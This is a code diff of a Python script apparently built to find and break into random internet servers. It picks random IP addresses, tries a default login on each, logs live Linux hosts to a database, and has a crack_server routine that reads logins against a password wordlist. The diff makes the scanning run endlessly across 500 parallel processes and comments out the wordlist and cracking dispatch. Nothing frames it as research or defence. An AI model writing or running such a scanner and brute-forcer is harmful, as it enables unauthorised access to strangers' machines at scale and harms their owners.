@@ -44,12 +44,13 @@ def save_hackability_server(ip, status, attempts):
     con.close()
            
 def get_hackability_servers(n):
-    ip = get_random_ip_address()
-    if is_live_linux_server(ip):
-        save_hackability_server(ip, 1280, f'{START_LOGIN}:{START_PASSWORD}')
-        print(ip, 'LIVE')
-    else:
-        print(ip, 'DEAD')
+    while True:
+        ip = get_random_ip_address()
+        if is_live_linux_server(ip):
+            save_hackability_server(ip, 1280, f'{START_LOGIN}:{START_PASSWORD}')
+            print(ip, 'LIVE')
+        else:
+            print(ip, 'DEAD')
 
 def is_live_linux_server(ip):
     if connect(ip, START_LOGIN, START_PASSWORD) in [1280]:
@@ -129,8 +130,8 @@ def crack_server(ip):
                 if result == 0:
                     update_data_in_servers(ip, login, password, attempts, result, 'True')
                 return None
-    passwords = open('all_passwords.txt', 'r').read().splitlines()
-    for login in logins:
+    # passwords = open('all_passwords.txt', 'r').read().splitlines()
+    # for login in logins:
 
                     
         
@@ -138,11 +139,11 @@ def crack_server(ip):
 
 if __name__ == '__main__':
     init_database()
+    n=500
+    multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
     # save_hackability_server('61.104.24.189', 1280, 'a:123')
     # init_csv_file('ip;login;password;status;is_my;datetime;attempts')
     # start = datetime.now()
-    # n=500
-    # multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
     # print(datetime.now()-start)
     # print(get_list_servers())
 
@@ -175,12 +176,12 @@ if __name__ == '__main__':
     # print(multiprocessing.active_children())
 
     
-    servers = get_list_servers_for_hack()
-    for ip in servers:
-        if len(multiprocessing.active_children()) < 10:
-            if ip not in [p.name for p in multiprocessing.active_children()]:
-                multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
-                print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])
+    # servers = get_list_servers_for_hack()
+    # for ip in servers:
+    #     if len(multiprocessing.active_children()) < 10:
+    #         if ip not in [p.name for p in multiprocessing.active_children()]:
+    #             multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
+    #             print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])
 
     # l=['a', 'b']
 
